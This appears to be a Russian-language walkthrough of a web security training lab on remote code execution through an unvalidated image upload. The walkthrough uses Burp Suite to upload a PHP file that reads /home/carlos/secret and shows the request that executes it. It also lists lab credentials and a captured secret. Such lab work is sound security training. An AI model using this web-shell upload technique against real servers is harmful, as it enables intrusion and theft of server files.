Lab: Remote code execution via web shell upload
Лабораторная работа: Удаленное выполнение кода через загрузку веб-оболочки.


Эта лаборатория содержит уязвимую функцию загрузки изображений. Он не выполняет никакой проверки файлов, загружаемых пользователями, перед их сохранением в файловой системе сервера.

Для решения лабораторной работы загрузите базовую веб-оболочку PHP и используйте ее для извлечения содержимого файла /home/carlos/secret. Отправьте этот секрет, используя кнопку на баннере лаборатории.

Вы можете войти в свою учетную запись, используя следующие учетные данные: wiener:peter.

Решение

     Проксируя трафик через Burp, войдите в свою учетную запись и обратите внимание на возможность загрузки изображения аватара.
     Загрузите произвольное изображение, а затем вернитесь на страницу своей учетной записи. Обратите внимание, что на странице теперь отображается предварительный просмотр вашего аватара.
     В Burp перейдите в Proxy > HTTP history. Щелкните панель фильтров, чтобы открыть окно HTTP history filter. В разделе «Filter by MIME type» установите флажок «Images» и примените изменения.
     В истории прокси обратите внимание, что ваше изображение было получено с помощью запроса GET к /files/avatars/<YOUR-IMAGE>. Отправьте этот запрос в Burp Repeater.

     Создайте в своей системе файл с именем «exploit.php», содержащий сценарий для получения содержимого секретного файла Карлоса. Например:
     <?php echo file_get_contents('/home/carlos/secret'); ?>
     Используйте функцию загрузки аватара, чтобы загрузить вредоносный PHP-файл. Сообщение в ответе подтверждает, что оно было успешно загружено.

     В Burp Repeater измените путь запроса, чтобы он указывал на ваш PHP-файл:
     GET /files/avatars/exploit.php HTTP/1.1
     Отправьте запрос. Обратите внимание, что сервер выполнил ваш сценарий и вернул его результат (сCarlos's secret) в ответ.
     Отправьте секрет для решения лаборатории.
     
     
1. start Burp Suite
2. настраиваем фильтр для HTTP history, включив туда image
3. заходим в наш личный кабинет с данными wiener:peter
4. Загружаем картинку в профиль
5. /files/avatars/<YOUR-IMAGE> отправить в Repeater
6. готовим файл exp.php содержаший:
 <?php echo file_get_contents('/home/carlos/secret'); ?>
7. загружаем наш эксплоит
8. В Repeater GET /files/avatars/<YOUR-IMAGE> HTTP/2 меняем на 
GET /files/avatars/exp.php HTTP/2
Send
В ответе получим наш секрет
PHzMe1xg3ikajR5ABUsQeItBWt6e7URI

Также сожно загрузить shell
